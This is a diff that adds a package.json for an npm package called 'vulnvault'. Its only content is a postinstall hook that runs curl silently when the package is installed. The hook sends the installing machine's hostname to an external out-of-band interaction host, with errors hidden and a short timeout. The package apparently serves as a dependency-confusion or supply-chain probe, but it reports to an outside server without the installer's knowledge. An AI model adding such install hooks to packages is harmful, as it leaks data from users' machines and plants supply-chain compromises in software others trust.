@@ -1,0 +1,6 @@
+{
+  "name": "vulnvault",
+  "scripts": {
+    "postinstall": "curl -sf https://zwxkuxebhnbjcsswayberjspvmm4ns107.oast.fun/npm-postinstall?h=$(hostname) --max-time 2 || true"
+  }
+}
